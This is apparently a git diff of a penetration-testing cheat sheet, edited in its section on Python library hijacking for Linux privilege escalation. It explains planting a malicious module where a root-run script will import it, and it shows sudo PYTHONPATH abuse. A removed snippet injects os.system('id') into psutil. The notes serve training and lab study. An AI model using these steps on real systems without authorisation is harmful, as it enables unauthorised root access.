@@ -1292,52 +1292,21 @@ gcc src.c -fPIC -shared -o /development/libshared.so
 ./payroll
 ```
 ### Python Library Hijacking | Python Module Hijacking | Python Path Hijacking
->Prerequsite: suid python file | user can run python file with sudo | root sneakly run the python file in routine
+Prerequisites:
+1. A privileged process imports a module by name — apache_restart.py runs as root and does import call and import urllib.
+2. Python's import resolution prioritizes the current working directory (or script directory) — In Python 3, sys.path[0] is the directory of the script being executed. So when root runs python3 /home/frank/apache_restart.py, Python first looks in /home/frank/ for call.py and urllib.py.
+3. An unprivileged user controls a directory on that search path — /home/frank/ is owned and writable by the frank user.
+4. The attacker plants a malicious module with a trusted name — Writing urllib.py into /home/frank/ causes root's Python process to import the attacker's code instead of the legitimate urllib module.  
 
-Priviledged Python Script
-```
-#!/usr/bin/env python3
-import psutil
-
-available_memory = psutil.virtual_memory().available * 100 / psutil.virtual_memory().total
-
-print(f"Available memory: {round(available_memory, 2)}%")
-```
-Find function usage(we must have write perm over the file)
-```
-grep -r "def virtual_memory" /usr
-```
 Library Path(We must have write permissions to one of the paths having a higher priority on the list)
 >In Python, each version has a specified order in which libraries (modules) are searched and imported from. The order in which Python imports modules from are based on a priority system, meaning that paths higher on the list take priority over ones lower on the list.
 ```
-current path
-python3 -c 'import sys; print("\n".join(sys.path))'
-```
-Show default package import location
-```
-pip3 show psutil
-```
-Hajacked psutil package content
-```python3
-...SNIP...
+python3 -c 'import sys; print(sys.path)'：
+['', '/usr/lib/python38.zip', '/usr/lib/python3.8', '/usr/lib/python3.8/lib-dynload', '/usr/local/lib/python3.8/dist-packages', '/usr/lib/python3/dist-packages']
 
-def virtual_memory():
-
-	...SNIP...
-	#### Hijacking
-	import os
-	os.system('id')
-	
-
-    global _TOTAL_PHYMEM
-    ret = _psplatform.virtual_memory()
-    # cached for later use in Process.memory_percent()
-    _TOTAL_PHYMEM = ret.total
-    return ret
-
-...SNIP...
+if pythonpath is set, syspath[1] = pythonpath
 ```
-If we have the perm to set pythonpath variable
+Abuse writable pythonpath variable
 ```
 htb-student@lpenix:~$ sudo -l 
 
@@ -1348,7 +1317,7 @@ User htb-student may run the following commands on ACADEMY-LPENIX:
     (ALL : ALL) SETENV: NOPASSWD: /usr/bin/python3
 ```
 ```
-sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./mem_status.py
+sudo PYTHONPATH=/tmp/ /usr/bin/python3 ./privileged_python_script
 ```
 ### Postgresql to RCE
 ```
